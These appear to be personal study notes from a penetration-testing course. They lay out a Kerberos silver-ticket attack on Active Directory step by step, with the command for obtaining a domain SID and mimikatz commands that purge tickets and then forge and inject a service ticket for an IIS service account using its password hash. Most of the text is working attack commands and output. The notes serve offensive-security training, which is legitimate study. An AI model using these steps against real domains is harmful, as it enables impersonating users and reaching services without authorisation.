
***As with Pass the Hash, Overpass the Hash also requires access to the special
admin share called Admin$, which in turn requires local administrative rights on
the target machine.***

1. To create the ticket, we first need the obtain the so-called Security Identifier or SID:

For example, an actual SID may look like this: S-1-5-21-2536614405-3629634762-1218571035-1116

* The first values in Listing 707 (“S-1-5”) are fairly static within AD. The subauthority value is dynamic
and consists of two primary parts: the domain’s numeric identifier (in this case “21-2536614405-
3629634762-1218571035”) and a relative identifier or RID 678 representing the specific object in the
domain (in this case “1116”).
--command--:
------------
C:\>whoami /user

output:
USER INFORMATION
----------------
User Name
SID
=========== ==============================================
corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103

2. flush any existing Kerberos tickets:
--->
mimikatz # kerberos::purge

3. verify the purge:
--->
mimikatz # kerberos::list

4. Creating a silver ticket for the iis_service service account:
* The silver ticket command requires a username ( /user ), domain name ( /domain ), the domain SID
( /sid ), which is highlighted above, the fully qualified host name of the service ( /target ), the
service type ( /service:HTTP ), and the password hash of the iis_service service account ( /rc4 ).
---->
mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-278
7523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748
290D87AA966C327 /ptt

5. verify:
---->
mimikatz # kerberos::list

**note:
To create a silver ticket, we use the password hash and not the cleartext
password. If a kerberoast session presented us with the cleartext password, we
must hash it before using it to generate a silver ticket.

=======================================================================


